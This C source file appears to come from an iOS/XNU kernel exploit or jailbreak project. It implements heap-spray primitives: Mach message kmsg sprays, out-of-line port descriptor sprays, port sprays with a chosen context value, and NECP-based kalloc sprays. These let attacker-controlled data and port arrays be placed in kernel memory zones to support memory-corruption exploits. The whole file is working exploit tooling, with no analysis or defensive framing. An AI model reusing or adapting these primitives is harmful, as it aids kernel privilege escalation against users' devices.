#include "spray.h"

#include "necp.h"

#include <mach/mach.h>
#include <stdlib.h>

mach_port_t *mcbc_spray_data_kalloc_kmsg(uint8_t *data, unsigned int size, unsigned int count)
{
    mach_port_t *ports = calloc(sizeof(mach_port_t), count);
    mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
    mach_msg_header_t *msg = (mach_msg_header_t *)data;
    
    memset(msg, 0, sizeof(mach_msg_header_t));
    msg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->msgh_size = size;
    
    for (unsigned int i = 0; i < count; ++i)
    {
        mach_port_construct(mach_task_self(), &options, 0, &ports[i]);
    }
    
    for (unsigned int i = 0; i < count; ++i)
    {
        msg->msgh_remote_port = ports[i];
        msg->msgh_id = i;
        mach_msg_send(msg);
    }
    
    return ports;
}

mach_port_t mcbc_spray_data_kalloc_kmsg_single(uint8_t *data, unsigned int size)
{
    mach_port_t port = MACH_PORT_NULL;
    mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
    mach_msg_header_t *msg = (mach_msg_header_t *)data;
    
    memset(msg, 0, sizeof(mach_msg_header_t));
    msg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->msgh_size = size;
    
    mach_port_construct(mach_task_self(), &options, 0, &port);

    msg->msgh_remote_port = port;
    mach_msg_send(msg);
    
    return port;
}

void mcbc_spray_data_kalloc_kmsg_on_ports(uint8_t *data, unsigned int size, unsigned int count, mach_port_t *ports)
{
    mach_msg_header_t *msg = (mach_msg_header_t *)data;
    
    memset(msg, 0, sizeof(mach_msg_header_t));
    msg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->msgh_size = size;
    //memcpy(msg + 1, data, size-sizeof(*msg));
    
    for (unsigned int i = 0; i < count; ++i)
    {
        msg->msgh_remote_port = ports[i];
        msg->msgh_id = i;
        mach_msg_send(msg);
    }
}


mach_port_t *mcbc_spray_data_kalloc_ool_descriptor(uint8_t *data, unsigned int size, unsigned int count)
{
    mach_port_t *ports = calloc(sizeof(mach_port_t), count);
    mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
    mach_msg_header_t *msg = (mach_msg_header_t *)calloc(1, size);
    
    msg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->msgh_size = size;
    
    for (unsigned int i = 0; i < count; ++i)
    {
        mach_port_construct(mach_task_self(), &options, 0, &ports[i]);
    }
    
    for (unsigned int i = 0; i < count; ++i)
    {
        msg->msgh_remote_port = ports[i];
        mach_msg_send(msg);
    }
    
    free(msg);
    
    return ports;
}

mach_port_t *mcbc_spray_default_kalloc_ool_ports(unsigned int size, unsigned int count, mach_port_t *ool_ports)
{
    return mcbc_spray_default_kalloc_ool_ports_with_data_kalloc_size(size, count, ool_ports, 0x50);
}

mach_port_t *mcbc_spray_default_kalloc_ool_ports_with_data_kalloc_size(unsigned int size, unsigned int count, mach_port_t *ool_ports, unsigned int data_kalloc_size)
{
    struct default_msg
    {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_ool_ports_descriptor_t desc;
    };
    
    mach_port_t *ports = calloc(sizeof(mach_port_t), count);
    mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
    struct default_msg *msg = (struct default_msg *)calloc(1, 0x100);
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_bits  |= MACH_MSGH_BITS_COMPLEX;
    msg->hdr.msgh_size = data_kalloc_size;
    msg->body.msgh_descriptor_count = 1;
    
    msg->desc.deallocate = 0;
    msg->desc.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->desc.copy = MACH_MSG_VIRTUAL_COPY;
    msg->desc.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg->desc.count = size/8;
    msg->desc.address = (void *)ool_ports;
    
    for (unsigned int i = 0; i < count; ++i)
    {
        mach_port_construct(mach_task_self(), &options, 0, &ports[i]);
    }
    
    for (unsigned int i = 0; i < count; ++i)
    {
        msg->hdr.msgh_remote_port = ports[i];
        kern_return_t kr = mach_msg_send((mach_msg_header_t *)msg);
        if (kr) {
            *(int *)1 = 0;
        }
    }
    
    free(msg);

    return ports;
}

void mcbc_spray_default_kalloc_ool_ports_on_port(unsigned int size, unsigned int count, mach_port_t *ool_ports, mach_port_t p)
{
    mcbc_spray_default_kalloc_ool_ports_with_data_kalloc_size_on_port(size, ool_ports, 0x50, p);
}

void mcbc_spray_default_kalloc_ool_ports_with_data_kalloc_size_on_port(unsigned int size, mach_port_t *ool_ports, unsigned int data_kalloc_size, mach_port_t p)
{
    struct default_msg
    {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_ool_ports_descriptor_t desc;
    };
    
    struct default_msg *msg = (struct default_msg *)calloc(1, 0x100);
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_bits  |= MACH_MSGH_BITS_COMPLEX;
    msg->hdr.msgh_size = data_kalloc_size;
    msg->body.msgh_descriptor_count = 1;
    
    msg->desc.deallocate = 0;
    msg->desc.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->desc.copy = MACH_MSG_VIRTUAL_COPY;
    msg->desc.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg->desc.count = size/8;
    msg->desc.address = (void *)ool_ports;
    
    msg->hdr.msgh_remote_port = p;
    kern_return_t kr = mach_msg_send((mach_msg_header_t *)msg);
    if (kr) {
        *(int *)1 = 0;
    }
    
    free(msg);
}


kern_return_t mcbc_spray_kmsg_on_port(mach_port_t port, void *data, size_t size)
{
    mach_msg_base_t *msg = data;
    msg->header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->header.msgh_remote_port = port;
    msg->header.msgh_size = (mach_msg_size_t)size;
    
    return mach_msg_send(&msg->header);
}

mach_port_t *mcbc_spray_ports_with_context(unsigned int count, uint64_t context)
{
    mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
    mach_port_t *ports = calloc(sizeof(mach_port_t), count);
    
    for (unsigned int i = 0; i < count; ++i)
    {
        mach_port_construct(mach_task_self(), &options, context, &ports[i]);
    }
    
    return ports;
}

mach_port_t *mcbc_spray_ports(unsigned int count)
{
    return mcbc_spray_ports_with_context(count, 0);
}

int mcbc_spray_default_kalloc_necp(int necp_fd, uint8_t *b, uint32_t sz)
{
    uint8_t if_id[0x10];
    return mcbc_necp_client_action(necp_fd, 1, if_id, sizeof(if_id), b, sz);
}

